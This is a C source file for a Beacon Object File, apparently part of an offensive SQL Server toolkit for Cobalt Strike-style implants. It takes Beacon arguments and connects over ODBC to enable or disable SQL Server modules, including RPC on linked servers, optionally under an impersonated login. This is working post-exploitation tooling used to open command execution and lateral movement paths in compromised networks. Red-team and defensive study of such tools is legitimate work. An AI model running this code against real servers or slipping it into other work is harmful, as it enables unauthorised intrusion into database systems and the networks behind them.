#include "base.c"
#include "bofdefs.h"
#include "sql.c"
#include "sql_modules.c"

void ToggleRpc(char *server, char *database, char *link, char *impersonate, char *value, char *user, char *password) {
  SQLHENV env = NULL;
  SQLHSTMT stmt = NULL;
  SQLHDBC dbc = NULL;

  dbc = ConnectToSqlServerAuth(&env, server, database, user, password);

  if (dbc == NULL) {
    goto END;
  }

  internal_printf("[*] Toggling RPC on %s...\n\n", link);

  ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);

  if (!ToggleModule(stmt, "rpc", value, link, impersonate)) {
    goto END;
  }

  ODBC32$SQLCloseCursor(stmt);

  if (!CheckRpcOnLink(stmt, link, impersonate)) {
    goto END;
  }

  PrintQueryResults(stmt, TRUE);

  ODBC32$SQLCloseCursor(stmt);

END:
  DisconnectSqlServer(env, dbc, stmt);
}

void ToggleGenericModule(char *server, char *database, char *link, char *impersonate, char *module, char *value, char *user, char *password) {
  SQLHENV env = NULL;
  SQLHSTMT stmt = NULL;
  SQLHDBC dbc = NULL;

  dbc = ConnectToSqlServerAuth(&env, server, database, user, password);

  if (dbc == NULL) {
    goto END;
  }

  ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);

  if (link == NULL) {
    internal_printf("[*] Toggling %s on %s...\n\n", module, server);
  } else {
    internal_printf("[*] Toggling %s on %s via %s\n\n", module, link, server);
  }

  if (!ToggleModule(stmt, module, value, link, impersonate)) {
    goto END;
  }

  ODBC32$SQLCloseCursor(stmt);

  CheckModuleStatus(stmt, module, link, impersonate);

  PrintQueryResults(stmt, TRUE);

END:
  ODBC32$SQLCloseCursor(stmt);
  DisconnectSqlServer(env, dbc, stmt);
}

VOID go(IN PCHAR Buffer, IN ULONG Length) {
  char *server;
  char *database;
  char *link;
  char *impersonate;
  char *module;
  char *value;
  char *user;
  char *password;

  datap parser;
  BeaconDataParse(&parser, Buffer, Length);

  server = BeaconDataExtract(&parser, NULL);
  database = BeaconDataExtract(&parser, NULL);
  link = BeaconDataExtract(&parser, NULL);
  impersonate = BeaconDataExtract(&parser, NULL);
  module = BeaconDataExtract(&parser, NULL);
  value = BeaconDataExtract(&parser, NULL);
  user = BeaconDataExtract(&parser, NULL);
  password = BeaconDataExtract(&parser, NULL);

  server = *server == 0 ? "localhost" : server;
  database = *database == 0 ? "master" : database;
  link = *link == 0 ? NULL : link;
  impersonate = *impersonate == 0 ? NULL : impersonate;
  user = *user == 0 ? NULL : user;
  password = *password == 0 ? NULL : password;

  if (!bofstart()) {
    return;
  }

  if (MSVCRT$strcmp(module, "rpc") == 0) {
    if (link == NULL) {
      internal_printf("[!] A link must be specified\n");
      printoutput(TRUE);
      return;
    }
    ToggleRpc(server, database, link, impersonate, value, user, password);
  }
  else {
    if (UsingLinkAndImpersonate(link, impersonate)) {
      return;
    }

    ToggleGenericModule(server, database, link, impersonate, module, value, user, password);
  }

  printoutput(TRUE);
};
